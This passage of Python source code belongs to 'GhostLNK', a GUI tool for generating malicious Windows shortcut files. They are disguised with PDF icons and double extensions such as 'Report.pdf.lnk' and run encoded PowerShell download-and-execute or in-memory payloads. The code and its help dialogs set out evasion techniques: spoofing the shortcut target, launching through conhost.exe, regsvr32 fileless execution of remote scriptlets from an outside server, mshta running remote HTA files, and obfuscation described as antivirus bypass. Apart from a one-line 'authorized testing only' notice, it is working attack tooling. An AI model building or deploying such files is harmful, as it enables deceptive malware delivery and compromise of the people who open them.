        self.raw_mode_cb.toggled.connect(self.toggle_raw_mode)
        raw_layout.addWidget(self.raw_mode_cb)
        self.raw_widget = QWidget()
        raw_sub_layout = QVBoxLayout(self.raw_widget)
        raw_sub_layout.setContentsMargins(10, 5, 10, 5)
        target_path_layout = QHBoxLayout()
        target_path_layout.addWidget(QLabel("Target Path:"))
        self.raw_target_path = QLineEdit()
        self.raw_target_path.setPlaceholderText("C:\\Windows\\System32\\mshta.exe")
        target_path_layout.addWidget(self.raw_target_path)
        browse_btn = QPushButton("Browse...")
        browse_btn.clicked.connect(self.browse_raw_target)
        target_path_layout.addWidget(browse_btn)
        raw_sub_layout.addLayout(target_path_layout)
        args_layout = QHBoxLayout()
        args_layout.addWidget(QLabel("Arguments:"))
        self.raw_arguments = QLineEdit()
        self.raw_arguments.setPlaceholderText("/c whoami  or  \"https://example.com/script.hta\"")
        args_layout.addWidget(self.raw_arguments)
        raw_sub_layout.addLayout(args_layout)
        note_label = QLabel(
            "📝 Note: The URL should be enclosed in quotes because it contains no spaces; "
            "quotes are optional but safe.<br>"
            "💡 Example: <code>\"https://example.com/script.hta\"</code>"
        )
        note_label.setWordWrap(True)
        note_label.setStyleSheet("color: #aaaaaa; font-size: 9px; margin-left: 5px;")
        raw_sub_layout.addWidget(note_label)
        workdir_layout = QHBoxLayout()
        workdir_layout.addWidget(QLabel("Working Dir (optional):"))
        self.raw_working_dir = QLineEdit()
        self.raw_working_dir.setPlaceholderText("%TEMP% or C:\\path")
        workdir_layout.addWidget(self.raw_working_dir)
        raw_sub_layout.addLayout(workdir_layout)
        self.raw_widget.setVisible(False)
        raw_layout.addWidget(self.raw_widget)
        raw_group.setLayout(raw_layout)
        layout.addWidget(raw_group)

        # PowerShell Import
        self.import_group = QGroupBox("Import -E Argument (PowerShell Mode)")
        import_layout = QHBoxLayout()
        self.import_input = QLineEdit()
        self.import_input.setPlaceholderText("Paste -E argument here...")
        import_layout.addWidget(self.import_input)
        import_btn = QPushButton("Import")
        import_btn.setMaximumWidth(60)
        import_btn.clicked.connect(self.import_arg)
        import_layout.addWidget(import_btn)
        self.import_group.setLayout(import_layout)
        layout.addWidget(self.import_group)

        # Direct Base64
        self.base64_group = QGroupBox("🔐 Direct Base64 Input (Raw PowerShell Script)")
        base64_layout = QVBoxLayout()
        self.base64_input = QTextEdit()
        self.base64_input.setPlaceholderText("Paste raw base64 string here (no -E prefix)...")
        self.base64_input.setMaximumHeight(60)
        self.base64_input.setStyleSheet("font-family: monospace;")
        base64_layout.addWidget(self.base64_input)
        btn_layout = QHBoxLayout()
        self.use_base64_btn = QPushButton("Use This Base64 as Payload")
        self.use_base64_btn.clicked.connect(self.use_raw_base64)
        btn_layout.addWidget(self.use_base64_btn)
        self.clear_base64_btn = QPushButton("Clear")
        self.clear_base64_btn.clicked.connect(lambda: self.base64_input.clear())
        btn_layout.addWidget(self.clear_base64_btn)
        base64_layout.addLayout(btn_layout)
        self.base64_group.setLayout(base64_layout)
        layout.addWidget(self.base64_group)

        # Advanced Evasion
        evasion_group = QGroupBox("🛡️ Advanced Evasion")
        evasion_layout = QVBoxLayout()

        # Proxy via conhost
        self.proxy_cb = QCheckBox("Use conhost.exe as proxy (Living off the Land)")
        self.proxy_cb.setToolTip(
            "Instead of launching powershell.exe directly, use the trusted conhost.exe binary.\n"
            "Command: conhost.exe powershell.exe -E <payload>"
        )
        evasion_layout.addWidget(self.proxy_cb)

        # LNK Stomping
        stomp_layout = QHBoxLayout()
        self.stomp_cb = QCheckBox("LNK Stomping: Spoof Target Path")
        self.stomp_cb.setToolTip(
            "Make the LNK appear to point to a benign file (e.g., invoice.pdf) while actually executing the payload.\n"
            "Enter the fake target path below."
        )
        stomp_layout.addWidget(self.stomp_cb)
        self.stomp_path = QLineEdit()
        self.stomp_path.setPlaceholderText("C:\\Users\\Public\\Documents\\invoice.pdf")
        self.stomp_path.setEnabled(False)
        self.stomp_cb.toggled.connect(lambda checked: self.stomp_path.setEnabled(checked))
        stomp_layout.addWidget(self.stomp_path)
        evasion_layout.addLayout(stomp_layout)

        # regsvr32 Proxy
        regsvr_layout = QHBoxLayout()
        self.regsvr_cb = QCheckBox("Use regsvr32.exe Proxy (Fileless)")
        self.regsvr_cb.setToolTip(
            "Execute a remote scriptlet/DLL via regsvr32.exe.\n"
            "Command: regsvr32 /s /n /i:\"http://server/file.sct\" scrobj.dll"
        )
        regsvr_layout.addWidget(self.regsvr_cb)
        self.regsvr_url = QLineEdit()
        self.regsvr_url.setPlaceholderText("http://192.168.1.100/payload.sct")
        self.regsvr_url.setEnabled(False)
        self.regsvr_cb.toggled.connect(lambda checked: self.regsvr_url.setEnabled(checked))
        regsvr_layout.addWidget(self.regsvr_url)
        evasion_layout.addLayout(regsvr_layout)

        evasion_group.setLayout(evasion_layout)
        layout.addWidget(evasion_group)

        # Preview
        preview_group = QGroupBox("Payload Preview")
        preview_layout = QVBoxLayout()
        preview_layout.addWidget(QLabel("Target: (not set)"))
        self.preview_label = QLabel("Arguments: (not set)")
        self.preview_label.setWordWrap(True)
        self.preview_label.setStyleSheet("color: #ffaa00; background-color: #16213e; padding: 3px;")
        preview_layout.addWidget(self.preview_label)
        preview_group.setLayout(preview_layout)
        layout.addWidget(preview_group)

        # Icon Selection
        icon_group = QGroupBox("Icon Selection")
        icon_layout = QVBoxLayout()
        self.icon_combo = QComboBox()
        self.icon_combo.addItems(list(self.ICON_DATABASE.keys()))
        self.icon_combo.setCurrentText("PDF Document")
        icon_layout.addWidget(self.icon_combo)
        icon_group.setLayout(icon_layout)
        layout.addWidget(icon_group)

        # Filename
        file_group = QGroupBox("Output Filename")
        file_layout = QGridLayout()
        file_layout.addWidget(QLabel("Base name:"), 0, 0)
        self.filename_input = QLineEdit("Report")
        file_layout.addWidget(self.filename_input, 0, 1)
        file_layout.addWidget(QLabel("Extension:"), 1, 0)
        self.ext_combo = QComboBox()
        self.ext_combo.addItems([".pdf", ".doc", ".xls", ".txt", ".ps1"])
        file_layout.addWidget(self.ext_combo, 1, 1)
        self.lnk_cb = QCheckBox("Add .lnk extension")
        self.lnk_cb.setChecked(True)
        file_layout.addWidget(self.lnk_cb, 2, 1)
        file_group.setLayout(file_layout)
        layout.addWidget(file_group)

        # Description
        desc_group = QGroupBox("File Description")
        desc_layout = QVBoxLayout()
        self.desc_input = QTextEdit()
        self.desc_input.setMaximumHeight(50)
        desc_layout.addWidget(self.desc_input)
        gen_desc_btn = QPushButton("Generate Description")
        gen_desc_btn.setMaximumWidth(120)
        gen_desc_btn.clicked.connect(self.generate_desc)
        desc_layout.addWidget(gen_desc_btn)
        desc_group.setLayout(desc_layout)
        layout.addWidget(desc_group)

        # Mode indicators
        self.mode_indicator = QLabel("Current Mode: Download & Open")
        self.mode_indicator.setStyleSheet("color: #88ff88; font-weight: bold;")
        layout.addWidget(self.mode_indicator)
        self.stealth_indicator = QLabel("Stealth: Maximum (AV Bypass)")
        self.stealth_indicator.setStyleSheet("color: #88ff88;")
        layout.addWidget(self.stealth_indicator)
        self.hide_indicator = QLabel("PowerShell Window: Visible")
        self.hide_indicator.setStyleSheet("color: #ffaa00;")
        layout.addWidget(self.hide_indicator)

        generate_btn = QPushButton("👻 GENERATE LNK FILE 👻")
        generate_btn.setMinimumHeight(45)
        generate_btn.setStyleSheet("background-color: #6a1f7a; font-size: 14px; font-weight: bold;")
        generate_btn.clicked.connect(self.generate_lnk)
        layout.addWidget(generate_btn)

        layout.addStretch()
        return panel

    def toggle_raw_mode(self, enabled):
        self.base64_group.setVisible(not enabled)
        self.raw_widget.setVisible(enabled)
        self.import_group.setVisible(not enabled)
        self.type_combo.setEnabled(not enabled)
        self.stealth_combo.setEnabled(not enabled)
        self.pause_cb.setEnabled(not enabled)
        self.debug_cb.setEnabled(not enabled)
        self.hide_pwsh_cb.setEnabled(not enabled)
        self.proxy_cb.setEnabled(not enabled)
        self.stomp_cb.setEnabled(not enabled)
        self.stomp_path.setEnabled(not enabled and self.stomp_cb.isChecked())
        self.regsvr_cb.setEnabled(not enabled)
        self.regsvr_url.setEnabled(not enabled and self.regsvr_cb.isChecked())
        if enabled:
            self.mode_indicator.setText("Current Mode: RAW TARGET (Custom EXE)")
            self.mode_indicator.setStyleSheet("color: #ffaa00; font-weight: bold;")
            self.stealth_indicator.setText("Stealth: N/A (raw target)")
            self.hide_indicator.setText("PowerShell: N/A")
            self.preview_label.setText("Raw target mode active - fill in target and arguments above")
        else:
            self.mode_indicator.setText("Current Mode: Download & Open")
            self.stealth_indicator.setText(f"Stealth: {['None', 'Moderate', 'Maximum'][self.stealth_combo.currentIndex()]}")
            self.hide_indicator.setText("PowerShell Window: Visible" if not self.hide_pwsh_cb.isChecked() else "PowerShell Window: HIDDEN")
            self.update_options()

    def browse_raw_target(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Target Executable", "C:\\", "Executable Files (*.exe);;All Files (*)")
        if file_path:
            self.raw_target_path.setText(file_path)

    def create_menu(self):
        menubar = self.menuBar()
        menubar.setStyleSheet("color: #e0e0e0; background-color: #16213e;")
        help_menu = menubar.addMenu("Help")
        about = QAction("About GhostLNK", self)
        about.triggered.connect(self.show_about)
        help_menu.addAction(about)
        mode_help = QAction("Mode Guide", self)
        mode_help.triggered.connect(self.show_mode_guide)
        help_menu.addAction(mode_help)
        stealth_help = QAction("Stealth Mode Guide", self)
        stealth_help.triggered.connect(self.show_stealth_help)
        help_menu.addAction(stealth_help)
        hide_help = QAction("Hidden PowerShell Guide", self)
        hide_help.triggered.connect(self.show_hide_help)
        help_menu.addAction(hide_help)
        raw_help = QAction("Raw Target Guide", self)
        raw_help.triggered.connect(self.show_raw_help)
        help_menu.addAction(raw_help)
        evasion_help = QAction("Advanced Evasion Guide", self)
        evasion_help.triggered.connect(self.show_evasion_help)
        help_menu.addAction(evasion_help)

    def show_evasion_help(self):
        QMessageBox.about(self, "Advanced Evasion Techniques",
            "<b>🛡️ Advanced Evasion Options</b><br><br>"
            "<b>conhost.exe Proxy:</b><br>"
            "Launches PowerShell via conhost.exe to evade parent‑process detection.<br><br>"
            "<b>LNK Stomping (Target Spoofing):</b><br>"
            "Makes the LNK appear to point to a benign file (e.g., invoice.pdf) while actually executing the payload. "
            "This bypasses structural analysis that inspects the LNK's displayed target.<br><br>"
            "<b>regsvr32.exe Proxy (Fileless):</b><br>"
            "Uses regsvr32.exe to execute a remote scriptlet (SCT) or DLL hosted on a WebDAV/HTTP server. "
            "Command: <code>regsvr32 /s /n /i:\"http://server/payload.sct\" scrobj.dll</code><br>"
            "This is a classic fileless execution method that keeps the payload off disk."
        )

    def show_raw_help(self):
        QMessageBox.about(self, "Raw Target Mode Guide",
            "<b>🎯 Raw Target Mode</b><br><br>"
            "Use this to generate LNK files that execute any program directly, bypassing PowerShell entirely.<br><br>"
            "<b>Example:</b><br>"
            "Target: C:\\Windows\\System32\\mshta.exe<br>"
            "Arguments: \"https://example.com/script.hta\"")

    def update_options(self):
        stealth = self.stealth_combo.currentIndex()
        hide_pwsh = self.hide_pwsh_cb.isChecked()
        self.pause_cb.setEnabled(True)
        self.debug_cb.setEnabled(True)
        self.hide_pwsh_cb.setEnabled(True)
        self.pause_cb.setStyleSheet("")
        self.debug_cb.setStyleSheet("")
        self.hide_pwsh_cb.setStyleSheet("")
        for cb in [self.pause_cb, self.debug_cb, self.hide_pwsh_cb]:
            cb.style().unpolish(cb)
            cb.style().polish(cb)
            cb.update()
        self.hide_indicator.setText("PowerShell Window: Visible")
        self.hide_indicator.setStyleSheet("color: #ffaa00;")
        mode_names = ["Download & Open", "Memory Execute", "Ultra Stealth"]
        current_mode = mode_names[self.type_combo.currentIndex()]
        self.mode_indicator.setText(f"Current Mode: {current_mode}")
        self.mode_indicator.setStyleSheet("color: #88ff88; font-weight: bold;")
        conflicts = []
        if hide_pwsh:
            self.pause_cb.setEnabled(False)
            self.pause_cb.setChecked(False)
            self.pause_cb.setStyleSheet("color: #666666;")
            conflicts.append("Pause disabled: Conflicts with hidden window")
            self.debug_cb.setEnabled(False)
            self.debug_cb.setChecked(False)
            self.debug_cb.setStyleSheet("color: #666666;")
            conflicts.append("Debug disabled: Debug output would be invisible")
            self.hide_pwsh_cb.setStyleSheet("color: #88ff88; font-weight: bold;")
            self.hide_indicator.setText("PowerShell Window: HIDDEN")
            self.hide_indicator.setStyleSheet("color: #88ff88; font-weight: bold;")
            for cb in [self.pause_cb, self.debug_cb, self.hide_pwsh_cb]:
                cb.style().unpolish(cb)
                cb.style().polish(cb)
                cb.update()
            self.mode_indicator.setText(f"Current Mode: {current_mode} (no pause, no debug)")
            self.mode_indicator.setStyleSheet("color: #ffaa00; font-weight: bold;")
        self.pause_cb.setToolTip(self.get_tooltip("pause", conflicts))
        self.debug_cb.setToolTip(self.get_tooltip("debug", conflicts))
        self.hide_pwsh_cb.setToolTip(self.get_tooltip("hide", conflicts))

    def get_tooltip(self, option, conflicts):
        base_tooltips = {
            "pause": "⏸️ Pause after execution - keeps window open until keypress",
            "debug": "🐛 Debug Mode - shows detailed verbose output",
            "hide": "🔒 Hide PowerShell Window - runs completely invisibly (may trigger AV)"
        }
        tooltip = base_tooltips.get(option, "")
        relevant_conflicts = [c for c in conflicts if option in c.lower()]
        if relevant_conflicts:
            tooltip += "\n\n❌ DISABLED:\n" + "\n".join(relevant_conflicts)
        return tooltip

    def on_stealth_changed(self):
        stealth = self.stealth_combo.currentIndex()
        hints = [
            "Normal: Standard output, visible window",
            "Moderate: Uses aliases, avoids obvious patterns",
            "Maximum: Obfuscated code, no suspicious flags, AV bypass attempt"
        ]
        self.stealth_hint.setText(hints[stealth])
        stealth_names = ["None", "Moderate", "Maximum"]
        self.stealth_indicator.setText(f"Stealth: {stealth_names[stealth]}")
        self.update_options()

    def on_url_changed(self):
        url = self.url_input.text().strip()
        if 'dropbox.com' in url.lower():
            if 'dl=1' not in url:
                self.dropbox_indicator.setText("⚠️ Missing dl=1! Add &dl=1 to the end")
                self.dropbox_indicator.setStyleSheet("color: #ff6666;")
            else:
                self.dropbox_indicator.setText("✓ dl=1 OK")
                self.dropbox_indicator.setStyleSheet("color: #66ff66;")
        else:
            self.dropbox_indicator.setText("")
        if url:
            guessed = PowerShellConverter.guess_payload_type(url)
            if guessed == "memory_execute" and '.ps1' in url.lower():
                self.type_combo.setCurrentIndex(1)

    def on_type_changed(self):
        types = [
            "📁 Download & Open: Saves file to temp and opens it. Best for PDFs, images, documents.",
            "⚡ Memory Execute: Downloads and runs PowerShell script in memory. For .ps1 files ONLY!",
            "🕵️ Ultra Stealth: Minimal output, just executes."
        ]
        self.type_hint.setText(types[self.type_combo.currentIndex()])
        mode_names = ["Download & Open", "Memory Execute", "Ultra Stealth"]
        self.mode_indicator.setText(f"Current Mode: {mode_names[self.type_combo.currentIndex()]}")
        self.mode_indicator.setStyleSheet("color: #88ff88; font-weight: bold;")
        self.update_options()

    def get_payload(self):
        url = self.url_input.text().strip()
        if not url:
            QMessageBox.warning(self, "Warning", "Please enter a URL first")
            return None
        pause = self.pause_cb.isChecked()
        debug = self.debug_cb.isChecked()
        stealth = self.stealth_combo.currentIndex()
        mode = self.type_combo.currentIndex()
        if mode == 0:
            return PowerShellConverter.create_download_and_open_payload(url, pause, debug, stealth)
        elif mode == 1:
            return PowerShellConverter.create_memory_execute_payload(url, pause, debug, stealth)
        else:
            return PowerShellConverter.create_stealth_payload(url, pause, debug, stealth)

    def load_url(self, url):
        self.url_input.setText(url)
        self.log(f"Loaded: {url[:50]}...")

    def show_command(self):
        payload = self.get_payload()
        if payload:
            self.cmd_display.setText(payload)
            mode = ["Download & Open", "Memory Execute", "Ultra Stealth"][self.type_combo.currentIndex()]
            stealth = ["Normal", "Moderate", "Maximum"][self.stealth_combo.currentIndex()]
            self.log(f"[✓] Command generated - Mode: {mode}, Stealth: {stealth}")
            self.step1_indicator.setText("✅ Step 1")
            self.step1_indicator.setStyleSheet("color: #88ff88;")
            self.step2_indicator.setText("⚪ Step 2")
            self.step2_indicator.setStyleSheet("color: #666666;")
            self.step3_indicator.setText("⚪ Step 3")
            self.step3_indicator.setStyleSheet("color: #666666;")
            self.step4_indicator.setText("⚪ Step 4")
            self.step4_indicator.setStyleSheet("color: #666666;")

    def encode(self):
        payload = self.get_payload()
        if payload:
            self.cmd_display.setText(payload)
            encoded = base64.b64encode(payload.encode('utf-16le')).decode()
            full_arg = f"-E {encoded}"
            self.arg_display.setText(full_arg)
            mode = ["Download & Open", "Memory Execute", "Ultra Stealth"][self.type_combo.currentIndex()]
            stealth = ["Normal", "Moderate", "Maximum"][self.stealth_combo.currentIndex()]
            self.log(f"[✓] Encoded - Mode: {mode}, Stealth: {stealth} | Length: {len(encoded)} chars")
            self.step1_indicator.setText("✅ Step 1")
            self.step1_indicator.setStyleSheet("color: #88ff88;")
            self.step2_indicator.setText("✅ Step 2")
            self.step2_indicator.setStyleSheet("color: #88ff88;")
            self.step3_indicator.setText("⚪ Step 3")
            self.step3_indicator.setStyleSheet("color: #666666;")
            self.step4_indicator.setText("⚪ Step 4")
            self.step4_indicator.setStyleSheet("color: #666666;")

    def copy_arg(self):
        arg = self.arg_display.toPlainText().strip()
        if arg:
            QApplication.clipboard().setText(arg)
            self.import_input.setText(arg)
            self.log("[✓] Copied to clipboard")
            self.step1_indicator.setText("✅ Step 1")
            self.step1_indicator.setStyleSheet("color: #88ff88;")
            self.step2_indicator.setText("✅ Step 2")
            self.step2_indicator.setStyleSheet("color: #88ff88;")
            self.step3_indicator.setText("✅ Step 3")
            self.step3_indicator.setStyleSheet("color: #88ff88;")
            self.step4_indicator.setText("⚪ Step 4")
            self.step4_indicator.setStyleSheet("color: #666666;")

    def use_in_lnk(self):
        arg = self.arg_display.toPlainText().strip()
        if arg:
            self.import_input.setText(arg)
            self.preview_label.setText(f"Arguments: {arg[:100]}...")
            self.log("[✓] Loaded into LNK generator")
            self.step1_indicator.setText("✅ Step 1")
            self.step1_indicator.setStyleSheet("color: #88ff88;")
            self.step2_indicator.setText("✅ Step 2")
            self.step2_indicator.setStyleSheet("color: #88ff88;")
            self.step3_indicator.setText("✅ Step 3")
            self.step3_indicator.setStyleSheet("color: #88ff88;")
            self.step4_indicator.setText("✅ Step 4")
            self.step4_indicator.setStyleSheet("color: #88ff88;")

    def import_arg(self):
        arg = self.import_input.text().strip()
        if arg:
            self.preview_label.setText(f"Arguments: {arg[:100]}...")
            self.log("[✓] Imported argument")

    def use_raw_base64(self):
        raw_b64 = self.base64_input.toPlainText().strip()
        if not raw_b64:
            QMessageBox.warning(self, "Warning", "No base64 string provided.")
            return
        try:
            decoded = base64.b64decode(raw_b64).decode('utf-16le')
            self.log(f"[✓] Base64 decoded successfully ({len(decoded)} chars)")
        except Exception as e:
            reply = QMessageBox.question(
                self, "Invalid Base64",
                f"Failed to decode as UTF-16LE base64:\n{str(e)}\n\nUse anyway?",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
            )
            if reply == QMessageBox.StandardButton.No:
                return
        full_arg = f"-E {raw_b64}"
        self.import_input.setText(full_arg)
        self.preview_label.setText(f"Arguments: {full_arg[:100]}...")
        self.log(f"[✓] Raw base64 loaded as payload (length {len(raw_b64)})")
        if not self.raw_mode_cb.isChecked():
            self.mode_indicator.setText("Current Mode: Direct Base64 Payload")
            self.mode_indicator.setStyleSheet("color: #88ff88; font-weight: bold;")

    def generate_desc(self):
        date = datetime.now().strftime("%d/%m/%Y")
        icon = self.icon_combo.currentText()
        self.desc_input.setText(f"Type: {icon}\nSize: 1.23 MB\nDate modified: {date}")

    def log(self, msg):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.console.append(f"[{timestamp}] {msg}")
        cursor = self.console.textCursor()
        cursor.movePosition(cursor.MoveOperation.End)
        self.console.setTextCursor(cursor)
        QApplication.processEvents()

    def generate_lnk(self):
        try:
            if self.raw_mode_cb.isChecked():
                target_path = self.raw_target_path.text().strip()
                if not target_path:
                    QMessageBox.warning(self, "Warning", "Raw Target Mode enabled but no target path specified.")
                    return
                target_path = os.path.expandvars(target_path)
                arguments = self.raw_arguments.text().strip()
                working_dir = self.raw_working_dir.text().strip() or None
                if working_dir:
                    working_dir = os.path.expandvars(working_dir)
                if not os.path.exists(target_path):
                    reply = QMessageBox.question(self, "Target Not Found",
                                                 f"The target '{target_path}' does not exist.\nDo you want to continue anyway?",
                                                 QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
                    if reply == QMessageBox.StandardButton.No:
                        return
                self.log(f"🎯 Raw Target Mode: {target_path} {arguments}")
                use_proxy = False
                spoof_target = None
                regsvr32_unc = None

            else:
                # Skip -E validation if regsvr32 proxy is enabled
                if not self.regsvr_cb.isChecked():
                    arg = self.import_input.text().strip() or self.arg_display.toPlainText().strip()
                    if not arg:
                        QMessageBox.warning(self, "Warning", "No -E argument set (or import one first).")
                        return
                else:
                    arg = ""  # dummy, not used in regsvr32 mode
                target_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
                arguments = arg
                working_dir = None
                use_proxy = self.proxy_cb.isChecked()
                spoof_target = self.stomp_path.text().strip() if self.stomp_cb.isChecked() else None
                regsvr32_unc = self.regsvr_url.text().strip() if self.regsvr_cb.isChecked() else None

            icon = self.icon_combo.currentText()
            icon_path, icon_idx, ext = self.ICON_DATABASE[icon]
            name = self.filename_input.text().strip() or "Document"
            ext_choice = self.ext_combo.currentText()
            filename = f"{name}{ext_choice}"
            if self.lnk_cb.isChecked():
                filename += ".lnk"
            desc = self.desc_input.toPlainText().strip()
            if not desc:
                self.generate_desc()
                desc = self.desc_input.toPlainText().strip()

            save_path, _ = QFileDialog.getSaveFileName(self, "Save LNK File", filename, "LNK Files (*.lnk)")
            if not save_path:
                return

            if not self.raw_mode_cb.isChecked():
                stealth = self.stealth_combo.currentIndex()
                hide = self.hide_pwsh_cb.isChecked()
                mode = ["Download & Open", "Memory Execute", "Ultra Stealth"][self.type_combo.currentIndex()]
                self.log(f"👻 Generating LNK (PowerShell) - Mode: {mode}, Stealth: {['Normal','Moderate','Maximum'][stealth]}, Hide: {hide}, Proxy: {use_proxy}, Stomp: {bool(spoof_target)}, regsvr32: {bool(regsvr32_unc)}")
            else:
                stealth = 0
                hide = False
                self.log(f"👻 Generating LNK (Raw Target) - Target: {target_path}")

            LNKEngine.create_lnk(
                save_path,
                target_path,
                arguments,
                icon_path,
                icon_idx,
                desc,
                working_dir=working_dir,
                stealth_level=stealth,
                hide_powershell=hide,
                use_proxy=use_proxy,
                spoof_target_path=spoof_target,
                regsvr32_unc=regsvr32_unc
            )

            size = os.path.getsize(save_path)
            self.log(f"[✓] LNK saved: {os.path.basename(save_path)} ({size} bytes)")
            QMessageBox.information(self, "Success", f"LNK generated:\n{save_path}")

        except Exception as e:
            self.log(f"❌ Error: {str(e)}")
            QMessageBox.critical(self, "Error", str(e))

    def show_mode_guide(self):
        QMessageBox.about(self, "Payload Mode Guide",
            "<b>📁 Download & Open Mode</b><br>"
            "- Saves file to temp folder<br>"
            "- Opens with default application<br>"
            "- Use for: PDFs, images, documents<br><br>"
            "<b>⚡ Memory Execute Mode</b><br>"
            "- Downloads and runs PowerShell script in memory<br>"
            "- No files saved to disk<br>"
            "- Use for: .ps1 script files ONLY<br><br>"
            "<b>🕵️ Ultra Stealth Mode</b><br>"
            "- Minimal output<br>"
            "- Just executes<br>"
            "- Good for background scripts")

    def show_stealth_help(self):
        QMessageBox.about(self, "Stealth Mode Guide",
            "<b>👻 Stealth Levels Explained</b><br><br>"
            "<b>Level 0 - Normal:</b><br>"
            "- Standard PowerShell commands<br>"
            "- Visible window with output<br>"
            "- May trigger AV detection<br><br>"
            "<b>Level 1 - Moderate Stealth:</b><br>"
            "- Uses aliases (iex instead of Invoke-Expression)<br>"
            "- Avoids obvious patterns<br>"
            "- Minimal output<br>"
            "- Better chance of bypassing AV<br><br>"
            "<b>Level 2 - Maximum Stealth (AV Bypass):</b><br>"
            "- Uses obfuscated variable names<br>"
            "- Avoids -WindowStyle Hidden flag<br>"
            "- Uses Start instead of Start-Process<br>"
            "- No comments or unnecessary code<br>"
            "- Best chance of evading detection")

    def show_hide_help(self):
        QMessageBox.about(self, "Hidden PowerShell Window Guide",
            "<b>🔒 Hidden PowerShell Window Feature</b><br><br>"
            "<b>What it does:</b><br>"
            "- Adds '-WindowStyle Hidden' to PowerShell arguments<br>"
            "- Runs PowerShell completely invisibly<br>"
            "- No console window appears at all<br><br>"
            "<b>⚠️ Important Notes:</b><br>"
            "- This flag is <b>well-known to AV</b> (Windows Defender, etc.)<br>"
            "- May trigger detection in security-conscious environments<br>"
            "- For MAXIMUM STEALTH, use Level 2 instead (window minimized, not hidden)")

    def show_about(self):
        QMessageBox.about(self, "About GhostLNK",
            "<b>GhostLNK</b><br><br>"
            "<b>Created by: github.com/Excalibra</b><br><br>"
            "Ultimate LNK Generator with:<br>"
            "✓ Multiple payload types<br>"
            "✓ 3 stealth levels<br>"
            "✓ Hidden PowerShell Window option<br>"
            "✓ Raw Target Mode<br>"
            "✓ Advanced Evasion: conhost proxy, LNK Stomping, regsvr32 fileless<br><br>"
            "⚠️ For authorized testing only")


def main():
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    window = GhostLNKGUI()
    window.show()
    sys.exit(app.exec())


if __name__ == "__main__":
    main()
